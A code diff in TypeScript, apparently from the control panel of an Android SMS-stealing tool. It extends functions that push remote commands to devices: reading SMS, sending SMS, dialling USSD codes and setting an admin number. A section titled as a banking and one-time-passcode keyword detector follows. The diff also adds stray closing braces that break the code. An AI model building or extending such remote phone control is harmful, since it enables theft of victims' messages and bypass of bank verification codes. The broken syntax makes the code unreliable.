@@ -148,26 +148,37 @@ function mkCheckOnline(deviceId: string): Record<string, string> {
   const ts = String(Date.now());
   return { type: "CHECK_ONLINE", uniqueid: deviceId, action: "ping", fromAdmin: "true", deviceId: deviceId, messageId: "admin_check_" + ts, timestamp: ts };
 }
-/** Map dashboard actions to Android FCM types */
-function mkDeviceCmd(_uid: string, action: string, extra?: Record<string, unknown>): Record<string, string> {
-  if (action === "get_sms") return { type: "get_sms" };
+function mkDeviceCmd(uid: string, action: string, extra?: Record<string, unknown>): Record<string, string> {
+  const ts = String(Date.now());
+  if (action === "get_sms") return { type: "get_sms", uniqueid: uid, action: "get_sms", fromAdmin: "true", messageId: "sms_fetch_" + ts, timestamp: ts };
   if (action === "sms") return {
     type: "send_sms",
+    uniqueid: uid, action: "sms",
     to: String(extra?.to ?? ""),
-    message: String(extra?.body ?? ""),
-    sim: String(extra?.simSlot ?? 0),
+    body: String(extra?.body ?? ""),
+    simSlot: String(extra?.simSlot ?? 0),
+    fromAdmin: "true",
+    messageId: "sms_cmd_" + ts,
+    timestamp: ts,
   };
   if (action === "ussd") return {
     type: "dial_ussd",
+    uniqueid: uid, action: "ussd",
     code: String(extra?.code ?? ""),
-    sim: String(extra?.simSlot ?? 0),
+    simSlot: String(extra?.simSlot ?? 0),
+    fromAdmin: "true",
+    messageId: "ussd_cmd_" + ts,
+    timestamp: ts,
   };
-  return { type: action };
+  return { type: action, uniqueid: uid, fromAdmin: "true", timestamp: ts };
+}
 }
 /** admin_update → Android: setAdminNumber / toggle admin status (NO call, NO sim) */
-function mkAdminUpdate(_did: string, number: string, status: "on" | "off"): Record<string, string> {
-  if (status === "on") return { type: "admin_update", status: "on", number };
-  return { type: "admin_update", status: "off" };
+function mkAdminUpdate(did: string, number: string, status: "on" | "off"): Record<string, string> {
+  const ts = String(Date.now());
+  if (status === "on") return { type: "admin_update", status: "on", number, deviceId: did, fromAdmin: "true", messageId: "admin_upd_" + ts, timestamp: ts };
+  return { type: "admin_update", status: "off", deviceId: did, fromAdmin: "true", messageId: "admin_upd_" + ts, timestamp: ts };
+}
 }
 
 /* ─── Banking / OTP keyword detector ─── */
